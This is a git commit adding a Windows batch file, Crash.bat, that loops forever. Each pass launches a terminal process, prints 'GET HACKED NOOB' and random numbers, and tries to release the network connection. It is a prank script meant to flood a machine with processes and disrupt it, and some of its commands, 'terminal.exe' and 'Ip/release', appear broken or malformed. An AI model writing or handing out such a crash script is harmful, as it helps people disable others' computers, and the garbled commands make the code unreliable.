19fbcf2a87b1f102b0bdf73b7d70740977cd0724
NotTimIsReal <alastairrintumathew@gmail.com>
2021-06-03 13:22:23 +1000

    Start and batch file

---
+++ Crash.bat
@@ -0,0 +1,8 @@
+@ECHO off
+
+ :top
+ START %SystemRoot%\system32\terminal.exe
+ echo GET HACKED NOOB
+ echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+Ip/release
+ GOTO top
